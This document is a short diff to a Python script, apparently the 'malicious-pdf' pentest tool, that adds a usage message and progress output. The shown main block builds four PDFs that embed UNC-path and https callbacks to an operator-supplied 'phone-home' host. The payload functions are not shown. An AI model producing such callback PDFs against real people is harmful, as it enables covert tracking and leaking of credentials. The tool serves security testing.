@@ -8,9 +8,9 @@
 ##
 ## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
 ##
-## Jonas Lejon, 2021 <jonas.github@triop.se>
+## Jonas Lejon, 2021 <jonas.github@triop.se> 
+## https://github.com/jonaslejon/malicious-pdf
 
-from __future__ import print_function
 import io
 import sys
 
@@ -161,9 +161,17 @@ trailer
 
 if __name__ == "__main__":
 
-  host = sys.argv[1]
+  try:
+    host = sys.argv[1]
+  except IndexError, e:
+      print("Usage: {} phone-home-url-without-http-prefix".format(sys.argv[0]))
+      sys.exit(1)
+
+  print("Creating PDF files..")
 
   create_malpdf("test1.pdf", '\\\\' + '\\\\'  + host + '\\\\' )
   create_malpdf("test2.pdf", 'https://' + host)
   create_malpdf2("test3.pdf", 'https://' + host)
   create_malpdf3("test4.pdf", 'https://' + host)
+
+  print("Done.")
